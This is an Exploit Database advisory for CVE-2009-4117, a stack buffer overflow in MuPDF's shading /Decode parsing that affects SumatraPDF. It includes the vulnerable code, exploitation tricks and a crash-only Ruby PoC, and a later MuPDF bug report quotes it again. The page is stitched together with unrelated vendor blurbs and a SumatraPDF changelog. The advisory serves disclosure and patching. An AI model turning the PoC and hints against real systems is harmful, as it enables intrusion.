# MuPDF < 20091125231942 - 'pdf\_shade4.c' Multiple Stack Buffer Overflows

#### EDB-ID:

###### 10244

#### CVE:

###### [2009-4117](https://nvd.nist.gov/vuln/detail/CVE-2009-4117)

---

**EDB Verified:**

#### Author:

###### [Christophe Devine](/?author=94)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

**Vulnerable App:**

```
"MuPDF is a lightweight PDF viewer and toolkit written in portable C".
It is used in particular by SumatraPDF which is a small open-source
PDF viewer for Windows.

MuPDF before commit 20091125231942 did not properly handle /Decode
arrays in a shading of type 4 to 7, leading to a stack-based buffer
overflow. Version 1.0.1 of SumatraPDF integrates this correction and
is no longer vulnerable -- it is recommended to upgrade to this version.
In addition, SumatraPDF 1.1 will have DEP enabled permanently on XP/
Vista/7 (through NtSetInformationProcess), as well as being marked
ASLR-compatible.

   Timeline
   ========

2009-11-23  MuPDF and SumatraPDF contacted
2009-11-25  fix integrated
2009-11-28  SumatraPDF 1.0.1 released

   Details
   =======

The vulnerable code is shown below:

   float c0[FZ_MAXCOLORS];
   float c1[FZ_MAXCOLORS];
...
   obj = fz_dictgets(shading, "Decode");
   if (fz_isarray(obj))
   {
...
       for (i=0; i < fz_arraylen(obj) / 2; ++i) {
           c0[i] = fz_toreal(fz_arrayget(obj, i*2+4));
           c1[i] = fz_toreal(fz_arrayget(obj, i*2+5));
       }
   }

Although SumatraPDF is compiled with /GS, for some reason Visual Studio
2008 failed to flag the vulnerable function. Thus, exploitation is not
particularly difficult, although there are a few tricks:

  * Care must be taken not to overwrite the obj pointer on the stack,
    as it would lead to a crash. Fortunately, the i variable is
    overwritten first, so one can simply increment it to skip obj.

  * The overwritten array handles a bunch of floating point values.
    So all hexadecimal values (such as the overwritten eip) must be
    converted into a floting point value, but not using scientific
    notation because the MuPDf parser cannot handle it.
    For example, 0x33 will be encoded as
    0.000000000000000000000000000000000000000000071

  * All 32-bit chunks of the shellcode need to have a valid floating
    point counterpart: no value must correspond to an IEEE 754 "NaN"
    (not a number). In practice, this can be easily achieved by
    inserting NOPs.

The origami PDF framework (see http://www.security-labs.org/origami/)
may be used to test this vulnerability. The following ruby script creates
a PDF with an oversized /Decode array:

# MuPDF pdf_loadtype4shade() PoC code (crash only)
# authors: Christophe Devine and Guillaume Delugré

$: << "sources/parser"
require 'parser.rb'
include Origami

sploit = [ 1234 ] * 250

shader = Graphics::Pattern::Shading::FreeFormTriangleMesh.new
shader.ColorSpace = Graphics::Color::Space::DEVICE_RGB
shader.BitsPerCoordinate = 24
shader.BitsPerComponent = 16
shader.BitsPerFlag = 8
shader.Decode = sploit

page = Page.new.add_shading(:kikoo, shader)
page.Contents = ContentStream.new
page.Contents.paint_shading(:kikoo)
PDF.new.append_page(page).saveas('toto.pdf')

How to modify this script to successfully exploit the vulnerability
is left as an exercise for the reader ;) Metasploit 3.3 was
used for the creation of the shellcode. This poc will not work with
other versions of SumatraPDF as it uses a jmp esp in the binary.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Version history [#](#version-history-1)

### next (3.6) [#](#next-3-6)

Changes in [pre-release builds](https://www.sumatrapdfreader.org/prerelease):

* improved zooming:
  + zooming with pinch touch screen gesture or with ctrl + scroll wheel now zooms around the mouse position and does continuous zoom levels. Used to zoom around top-left corner and progress fixed zoom levels shown in menu
* include manual (`F1` to launch browser with documentation)
* add `LazyLoading` advanced setting, defaults to true. When restoring a session lazy loading delays loading a file until its tab is selected. Makes SumatraPDF startup faster.
* new commands in command palette (`Ctrl + K`):
  + `CmdCloseAllTabs` : “Close All Tabs”
  + `CmdCloseTabsToTheLeft` : “Close Tabs To The Left”
  + `CmdDeleteFile`: “Delete File”
  + `CmdToggleFrequentlyRead` : “Toggle Frequently Read”
  + `CmdToggleLinks` : “Toggle Show Links”
  + `CmdInvokeInverseSearch`
  + `CmdMoveTabRight` (`Ctrl + Shift + PageUp`), `CmdMoveTabLeft` (`Ctrl + Shift + PageDown`) to move tabs left / right, like in Chrome
* add ability to provide arguments to some commands when creating bindings in `Shortcuts`:
  + CmdCreateAnnot\* commands take a color argument, `openedit` to automatically open edit annotations window when creating an annotation, `copytoclipboard` to copy selection to clipboard and `setcontent` to set contents of annotation to selection
  + `CmdScrollDown`, `CmdScrollUp` : integer argument, how many lines to scroll
  + `CmdGoToNextPage`, `CmdGoToPrevPage` : integer argument, how many pages to advance
  + `CmdNextTabSmart`, `CmdPrevTabSmart` (`Smart Tab Switch`), shortcut: `Ctrl + Tab`, `Ctrl + Shift + Tab``
* added `UIFontSize` advanced setting
* removed `TreeFontWeightOffset` advanced setting
* increase number of thumbnails on home page from 10 => 30
* add `ShowLinks` advanced setting and “Toggle Show Links” (`CmdToggleLinks`) for command palette
* default `ReuseInstance` setting to true
* added `Key` arg to `ExternalViewers` advanced setting (keyboard shortcut)
* added `Key` arg to `SelectionHandlers` advanced setting (keyboard shortcut)
* improved scrolling with mouse wheel and touch gestures
* theming improvements
* go back to opening settings file with default .txt editor (notepad most likely)
* don’t exit fullscreen on double-click. must double-click in upper-right corner
* when opening via double-click, if `Ctrl` is pressed will always open in new tab (vs. activating existing tab)
* register for handling `.webp` files
* bug fix: Del should not delete an annotation if editing content
* bug fix: re-enable tree view full row select
* change: `CmdCreateAnnotHighlight` etc. no longer copies selection to clipboard by default. To get that behavior back, you can use `copytoclipboard` argument [instead](Commands#cmdcreateannothighlight-and-other-cmdcreateannot).
* change: `Ctrl + Tab` is now `CmdNextTabSmart`, was `CmdNextTab`. `Ctrl + Shift + Tab` is now `CmdPrevTabSmart`, was `CmdPrevTab`. You can [re-bind it](Customizing-keyboard-shortcuts) if you prefer old behavior
* `CmdCommandPalette` takes optional `mode` argument: `@` for tab selection, `#` for selecting from file history and `>` for commands.
* command palette no longer shows combined tabs/file history/commands. `CmdCommandPalette` only shows commands. Because of that removed `CmdCommandPaletteNoFiles` because now ``CmdCommandPalette` behaves like it
* removed `CmdCommandPaletteOnlyTabs`, replaced by`CmdCommandPaletteNoFiles @`
* `Ctrl + Shift + K` no longer active, use `Ctrl + K`. You can restore this shortcut by binding it to `CmdCommandPalette >` command.
* add `Name` field for shortcuts. If given, the command will show up in Command Palette (`Ctrl + K`)
* closing a current tab now behaves like in Chrome: selects next tab (to the right). We used to select previously active tab, but that’s unpredicable and we prefer to align SumatraPDF behavior with other popular apps.
* swapped key bindings: ‘i’ is now CmdTogglePageInfo, ‘I’ is CmdInvertColors. Several people were confused by accidentally typing ‘i’ to invert colors, is less likely to type it accidentally
* allow creating custom themes in advanced settings in `Themes` section. [See docs](https://www.sumatrapdfreader.org/docs/Customize-theme-colors).
* improve scrolling with middle click drag [#4529](https://github.com/sumatrapdfreader/sumatrapdf/issues/4529)

| [Description](show_bug.cgi?id=708030#c0)  Sebastian Rasmussen    2024-09-13 15:08:01 UTC  ``` This is a bug report created after the fact to contain the information about CVE-2009-4117 concerning MuPDF 0.5. The CVE report was archived here: <https://www.exploit-db.com/exploits/10244>  The report is also quoted here in full:  "MuPDF is a lightweight PDF viewer and toolkit written in portable C". It is used in particular by SumatraPDF which is a small open-source PDF viewer for Windows.  MuPDF before commit [20091125231942](http://www.ghostscript.com/cgi-bin/findgit.cgi?20091125231942) did not properly handle /Decode arrays in a shading of type 4 to 7, leading to a stack-based buffer overflow. Version 1.0.1 of SumatraPDF integrates this correction and is no longer vulnerable -- it is recommended to upgrade to this version. In addition, SumatraPDF 1.1 will have DEP enabled permanently on XP/ Vista/7 (through NtSetInformationProcess), as well as being marked ASLR-compatible.      Timeline    ========  2009-11-23  MuPDF and SumatraPDF contacted 2009-11-25  fix integrated 2009-11-28  SumatraPDF 1.0.1 released      Details    =======  The vulnerable code is shown below:     float c0[FZ_MAXCOLORS];    float c1[FZ_MAXCOLORS]; ...    obj = fz_dictgets(shading, "Decode");    if (fz_isarray(obj))    { ...        for (i=0; i < fz_arraylen(obj) / 2; ++i) {            c0[i] = fz_toreal(fz_arrayget(obj, i*2+4));            c1[i] = fz_toreal(fz_arrayget(obj, i*2+5));        }    }  Although SumatraPDF is compiled with /GS, for some reason Visual Studio 2008 failed to flag the vulnerable function. Thus, exploitation is not particularly difficult, although there are a few tricks:    * Care must be taken not to overwrite the obj pointer on the stack,     as it would lead to a crash. Fortunately, the i variable is     overwritten first, so one can simply increment it to skip obj.    * The overwritten array handles a bunch of floating point values.     So all hexadecimal values (such as the overwritten eip) must be     converted into a floting point value, but not using scientific     notation because the MuPDf parser cannot handle it.     For example, 0x33 will be encoded as     0.000000000000000000000000000000000000000000071    * All 32-bit chunks of the shellcode need to have a valid floating     point counterpart: no value must correspond to an IEEE 754 "NaN"     (not a number). In practice, this can be easily achieved by     inserting NOPs.  The origami PDF framework (see <http://www.security-labs.org/origami/>) may be used to test this vulnerability. The following ruby script creates a PDF with an oversized /Decode array:  # MuPDF pdf_loadtype4shade() PoC code (crash only) # authors: Christophe Devine and Guillaume Delugré  $: << "sources/parser" require 'parser.rb' include Origami  sploit = [ 1234 ] * 250  shader = Graphics::Pattern::Shading::FreeFormTriangleMesh.new shader.ColorSpace = Graphics::Color::Space::DEVICE_RGB shader.BitsPerCoordinate = 24 shader.BitsPerComponent = 16 shader.BitsPerFlag = 8 shader.Decode = sploit  page = Page.new.add_shading(:kikoo, shader) page.Contents = ContentStream.new page.Contents.paint_shading(:kikoo) PDF.new.append_page(page).saveas('toto.pdf')   How to modify this script to successfully exploit the vulnerability is left as an exercise for the reader ;) Metasploit 3.3 was used for the creation of the shellcode. This poc will not work with other versions of SumatraPDF as it uses a jmp esp in the binary. ```  [Comment 1](show_bug.cgi?id=708030#c1)  Sebastian Rasmussen    2024-09-13 15:08:36 UTC  ``` This was fixed back in 2009 by:  commit [a21cc1548993c392e474817bb3d656eb3730d88f](http://www.ghostscript.com/cgi-bin/findgit.cgi?a21cc1548993c392e474817bb3d656eb3730d88f) Author: Sebastian Rasmussen <sebras@hotmail.com> Date:   Wed Nov 25 22:58:00 2009 +0100      Limit number of components in Separation/DeviceN colorspace to FZ_MAXCOLORS.   And further improved by:  commit [cf6860c3d70a2f7a63cdb621cc3b58c891915deb](http://www.ghostscript.com/cgi-bin/findgit.cgi?cf6860c3d70a2f7a63cdb621cc3b58c891915deb) Author: Sebastian Rasmussen <sebras@hotmail.com> Date:   Thu Nov 26 00:19:42 2009 +0100      Factor out color decode parsing to common function for shadings type 4-7. ``` |  |

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
